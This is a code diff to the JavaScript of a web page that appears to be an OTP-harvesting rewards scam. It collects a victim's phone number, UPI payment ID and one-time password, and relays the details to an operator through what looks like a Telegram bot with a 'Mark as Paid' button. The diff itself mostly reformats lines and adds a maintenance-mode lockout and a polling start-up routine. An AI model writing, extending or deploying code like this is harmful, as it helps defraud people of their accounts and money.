     buildOtpBoxes(4);
     document.querySelectorAll('.otp-type-btn').forEach(b => b.classList.remove('active'));
     document.querySelector('[data-digits="4"]').classList.add('active');
     document.getElementById('err2').textContent = '';
     hide('waitingBox');
     const vBtn = document.getElementById('verifyOtpBtn');
-    vBtn.disabled = false; vBtn.textContent = 'Submit OTP →';
+    vBtn.disabled = false; 
+    vBtn.textContent = 'Submit OTP →';
     document.getElementById('phone').value = currentPhone;
-    document.getElementById('upi').value   = currentUpi;
+    document.getElementById('upi').value = currentUpi;
     document.getElementById('err1').textContent = '';
     const sBtn = document.getElementById('submitDetailsBtn');
-    sBtn.disabled = false; sBtn.textContent = 'Send OTP Request →';
-    hide('step3'); show('step1');
-    pendingMsgId = null; pendingMsgId2 = null;
+    sBtn.disabled = false; 
+    sBtn.textContent = 'Send OTP Request →';
+    hide('step3'); 
+    show('step1');
+    pendingMsgId = null; 
+    pendingMsgId2 = null;
   });
 
   // ── Withdraw ──
   document.getElementById('withdrawBtn').addEventListener('click', () => {
+    if (isMaintenanceMode()) {
+      showPopup('maintenancePopup');
+      return;
+    }
+    
     if (walletBal < 5) return;
+    
     document.querySelectorAll('.amt-btn').forEach(b => {
       b.classList.remove('selected');
       b.disabled = parseInt(b.dataset.amt) > walletBal;
       b.style.opacity = parseInt(b.dataset.amt) > walletBal ? '0.35' : '1';
     });
+    
     document.getElementById('withdrawMsg').textContent = '';
     document.getElementById('confirmWithdrawBtn').disabled = true;
     selectedWithdrawAmt = 0;
@@ -914,9 +1170,11 @@
 
   document.getElementById('confirmWithdrawBtn').addEventListener('click', async () => {
     if (!selectedWithdrawAmt || selectedWithdrawAmt > walletBal) return;
+    
     const amt = selectedWithdrawAmt;
     const btn = document.getElementById('confirmWithdrawBtn');
-    btn.disabled = true; btn.textContent = 'Sending...';
+    btn.disabled = true; 
+    btn.textContent = 'Sending...';
     
     const withdrawId = Date.now().toString();
     
@@ -926,7 +1184,7 @@
       `💳 <b>UPI ID:</b> <code>${currentUpi}</code>\n` +
       `💰 <b>Amount:</b> ₹${amt}\n` +
       `⏳ <b>Status:</b> Processing...\n\n` +
-      `Click below when payment is completed:`,
+      `Click below when paid:`,
       { inline_keyboard: [[{ text: '✅ Mark as Paid', callback_data: `withdraw_paid_${currentPhone}_${withdrawId}` }]] }
     ).catch(()=>{});
     
@@ -972,14 +1230,34 @@
     document.getElementById('otpBoxes').querySelectorAll('.otp').forEach(i => i.value = '');
     document.getElementById('o1') && document.getElementById('o1').focus();
     const btn = document.getElementById('verifyOtpBtn');
-    btn.disabled = false; btn.textContent = 'Submit OTP →';
+    btn.disabled = false; 
+    btn.textContent = 'Submit OTP →';
   });
+  
   document.getElementById('closeWithdrawSuccess').addEventListener('click', () => hidePopup('withdrawSuccessPopup'));
   document.getElementById('closeNumberUsed').addEventListener('click', () => hidePopup('numberUsedPopup'));
   document.getElementById('closeUpiUsed').addEventListener('click', () => hidePopup('upiUsedPopup'));
   document.getElementById('closeReward').addEventListener('click', () => hidePopup('rewardPopup'));
   document.getElementById('closeLimitPopup').addEventListener('click', () => hidePopup('limitPopup'));
   document.getElementById('closeWithdraw').addEventListener('click', () => hidePopup('withdrawPopup'));
+  
+  // ── Initialize ──
+  async function init() {
+    // Check maintenance mode
+    if (isMaintenanceMode()) {
+      show('maintenancePopup');
+      document.getElementById('mainContent').style.pointerEvents = 'none';
+      document.getElementById('mainContent').style.opacity = '0.3';
+    }
+    
+    // Test connection
+    await testBotConnection();
+    
+    // Start polling
+    startPolling();
+  }
+  
+  init();
 </script>
 </body>
 </html>
